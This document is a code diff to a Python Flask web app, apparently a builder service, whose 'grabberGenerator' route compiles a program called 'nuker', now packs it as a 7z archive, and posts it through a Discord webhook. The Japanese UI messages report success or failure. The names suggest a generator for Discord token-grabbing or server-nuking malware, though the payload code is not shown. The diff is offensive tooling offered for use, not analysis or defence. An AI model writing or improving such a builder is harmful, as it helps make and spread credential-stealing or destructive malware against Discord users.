@@ -1,4 +1,4 @@
-import subprocess, threading, traceback, shutil, asyncio, string, random, time, sys, os
+import subprocess, threading, traceback, shutil, string, random, py7zr, sys, os
 import discordWebhook, discordBot
 from flask import Flask, request, redirect, render_template
 
@@ -105,12 +105,12 @@ def grabberGenerator():
             
             subprocess.run("pip install "+" ".join(libraries), shell=True)
             subprocess.run(f"{sys.executable} temp/{randomStr}-setup.py build", shell=True)
-            shutil.make_archive('nuker', 'zip', root_dir='temp/nuker')
-            response = discord.sendFile("nuker.zip")
+            with py7zr.SevenZipFile("nuker.7z", 'w', filters=[{'id': py7zr.FILTER_LZMA2, 'preset': 9}]) as archive:
+                archive.writeall("./temp/nuker/", arcname='')
+            response = discord.sendFile("nuker.7z")
             shutil.rmtree('temp')
-            os.remove("nuker.zip")
-            
-            if response.status_code == 204:
+            os.remove("nuker.7z")
+            if str(response.status_code)[0] == "2":
                 return render_template('grabberGenerator.html', success="成功しました")
             else:
                 return render_template('grabberGenerator.html', error="ファイル送信中にエラーが発生しました")
